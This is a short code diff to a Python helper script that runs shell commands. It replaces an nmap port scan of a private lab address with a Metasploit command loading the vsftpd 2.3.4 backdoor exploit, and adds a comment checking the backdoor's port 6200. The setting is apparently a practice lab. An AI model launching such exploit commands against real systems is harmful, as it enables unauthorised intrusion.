@@ -34,10 +34,12 @@ if __name__ == "__main__":
     print("🔥 run_manual.py started")
     try:
         output = run_clean_output(
-            "nmap -p1-65535 -T4 192.168.56.101".strip(),
+            ["msfconsole", "-q", "-x", "use exploit/unix/ftp/vsftpd_234_backdoor"],
             timeout=60
         )
         print("\n✅ פלט שנשמר למשתנה:\n")
         print(output)
     except TimeoutError as e:
         print(f"❌ Timeout: {e}")
+
+# sudo netstat -plant | grep :6200
